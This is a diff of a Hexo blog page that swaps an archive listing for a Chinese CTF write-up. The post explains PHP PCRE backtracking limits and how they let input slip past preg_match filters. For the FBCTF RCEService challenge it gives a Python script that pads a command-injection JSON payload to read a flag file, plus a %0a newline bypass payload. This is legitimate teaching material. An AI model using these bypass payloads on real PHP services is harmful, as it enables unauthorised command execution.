@@ -6,20 +6,24 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives: 2020/4 | Welcome to Tristan&#39;s Blog!</title>
+  <title>PRCE回溯 | Welcome to Tristan&#39;s Blog!</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="南京邮电大学2018级，web狗~；个人技术分享博客~">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Welcome to Tristan&#39;s Blog!">
-<meta property="og:url" content="http://yoursite.com/archives/2020/04/page/2/index.html">
+  <meta name="description" content="之前针对&#x2F;^xxx$&#x2F;的正则匹配，介绍过可以使用%0a绕过；今天通过一道题目看了下P神的PREC回溯绕过正则匹配的方法，就记录学习一下； 回溯过程首先了解一下回溯过程，当有一个正则为&#x2F;&lt;?.*[(&#96;;?&gt;].&#x2F;。假设匹配的输入是&lt;?php phpinfo();&#x2F;&#x2F;aaaaa，实际匹配的流程是这样的：(接用下P神的图)当匹配到.\时，会最终匹配到字符串结尾。但因为对于正则表达式来说">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PRCE回溯">
+<meta property="og:url" content="http://yoursite.com/2020/04/29/PRCE%E5%9B%9E%E6%BA%AF/index.html">
 <meta property="og:site_name" content="Welcome to Tristan&#39;s Blog!">
-<meta property="og:description" content="南京邮电大学2018级，web狗~；个人技术分享博客~">
+<meta property="og:description" content="之前针对&#x2F;^xxx$&#x2F;的正则匹配，介绍过可以使用%0a绕过；今天通过一道题目看了下P神的PREC回溯绕过正则匹配的方法，就记录学习一下； 回溯过程首先了解一下回溯过程，当有一个正则为&#x2F;&lt;?.*[(&#96;;?&gt;].&#x2F;。假设匹配的输入是&lt;?php phpinfo();&#x2F;&#x2F;aaaaa，实际匹配的流程是这样的：(接用下P神的图)当匹配到.\时，会最终匹配到字符串结尾。但因为对于正则表达式来说">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yoursite.com/2020/04/29/images/59.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/04/29/images/60.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/04/29/images/61.jpg">
+<meta property="article:published_time" content="2020-04-29T07:54:29.000Z">
+<meta property="article:modified_time" content="2020-04-29T08:32:13.205Z">
 <meta property="article:author" content="Tristan">
-<meta property="article:tag" content="web">
-<meta property="article:tag" content="CTFer，hardworking">
-<meta property="article:tag" content="passionate">
+<meta property="article:tag" content="绕过正则匹配">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/04/29/images/59.jpg">
   
     <link rel="alternative" href="/atom.xml" title="Welcome to Tristan&#39;s Blog!" type="application/atom+xml">
   
@@ -137,329 +141,152 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-PRCE回溯" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      PRCE回溯
+    </h1>
+  
+
+        
+        <a href="/2020/04/29/PRCE%E5%9B%9E%E6%BA%AF/" class="archive-article-date">
+  	<time datetime="2020-04-29T07:54:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-29</time>
+</a>
+        
+      </header>
     
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>之前针对/^xxx$/的正则匹配，介绍过可以使用%0a绕过；今天通过一道题目看了下P神的PREC回溯绕过正则匹配的方法，就记录学习一下；</p>
+<h4 id="回溯过程"><a href="#回溯过程" class="headerlink" title="回溯过程"></a>回溯过程</h4><p>首先了解一下回溯过程，当有一个正则为/&lt;?.*[(`;?&gt;].<em>/。假设匹配的输入是&lt;?php phpinfo();//aaaaa，实际匹配的流程是这样的：<br><img src="../images/59.jpg" alt="1"><br>(接用下P神的图)<br>当匹配到.\</em>时，会最终匹配到字符串结尾。但因为对于正则表达式来说，应该还要匹配一个字符[(`;?&gt;];所以开始回溯，从后往前，先吐出一个a，发现不匹配，继续吐a….直到吐出;后，匹配上了，于是继续下一个匹配，即.*，匹配到结尾。到这匹配结束；<br>我们可以发现，这里总共回溯了8次；<br>而PHP为了给PCRE设定了一个回溯次数上限；当超过回溯次数后，就会返回false。<br><img src="../images/60.jpg" alt="2"><br><img src="../images/61.jpg" alt="3"><br>于是我们就可以利用这一点，进行正则表达式绕过；</p>
+<h4 id="实例演示"><a href="#实例演示" class="headerlink" title="实例演示"></a>实例演示</h4><p>FBCTF——RCEService<br>题目要求输入json格式，首先尝试{“cmd”:”ls”},回显结果index.php；但有很多常用命令被过滤；这时可以在我们的命令后加上1000000个a从而绕过正则匹配，达到命令执行的效果；</p>
+<pre><code>import requests
+
+payload = &apos;{&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,test:&apos; + &quot;a&quot;*(1000000) + &apos;&quot;}&apos;
+res = requests.post(&quot;http://af72594c-dbfc-4ef9-baa3-0738dbb5fdb9.node3.buuoj.cn/&amp;quot;&quot;, data={&quot;cmd&quot;:payload})
+print(res.text)</code></pre><p>拿到flag<br>这题还有一个非预期解，就是可以使用%0a绕过；<br>payload:</p>
+<pre><code>?cmd={%0a%22cmd%22:%20%22/bin/cat%20/home/rceservice/flag%22%0a}</code></pre>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/04/15/Burpsuite/" class="archive-article-date">
-  	<time datetime="2020-04-15T10:52:03.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-15</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/04/15/Burpsuite/">Burpsuite</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">burpsuite</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">绕过正则匹配</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/04/29/PRCE%E5%9B%9E%E6%BA%AF/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/04/15/sqlmap/" class="archive-article-date">
-  	<time datetime="2020-04-15T09:05:04.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-15</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2020/04/29/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5-%E4%BA%8C/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">无列名注入(二)</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/04/15/sqlmap/">sqlmap</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">sqlmap</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/04/11/Online-tool/" class="archive-article-date">
-  	<time datetime="2020-04-11T10:11:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-11</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/04/11/Online-tool/">Online-tool</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">PHP代码审计，RCE</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/04/11/phpmyadmin4-8-1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="archive-article-date">
-  	<time datetime="2020-04-11T07:18:28.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-11</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/04/11/phpmyadmin4-8-1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">phpmyadmin4.8.1 任意文件包含漏洞</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">php代码审计，文件包含</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/04/10/SSRF-me/" class="archive-article-date">
-  	<time datetime="2020-04-10T12:41:28.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-10</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/04/10/SSRF-me/">SSRF_me</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">代码审计，hash_dump</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/04/07/Fakebook/" class="archive-article-date">
-  	<time datetime="2020-04-07T09:02:20.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-07</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/04/07/Fakebook/">Fakebook</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">sql,PHP反序列化,ssrf</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/04/07/GXY-Ping/" class="archive-article-date">
-  	<time datetime="2020-04-07T07:19:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-07</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/04/07/GXY-Ping/">GXY-Ping</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">web,命令执行,CTF</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/04/01/Preg-replace/" class="archive-article-date">
-  	<time datetime="2020-04-01T00:40:09.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-01</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/04/01/Preg-replace/">Preg_replace引起的命令执行漏洞</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">web,CTF,PHP</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/archives/2020/04/">&amp;laquo; Prev</a><a class="page-number" href="/archives/2020/04/">1</a><span class="page-number current">2</span>
-    </nav>
   
 
 
@@ -483,8 +310,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
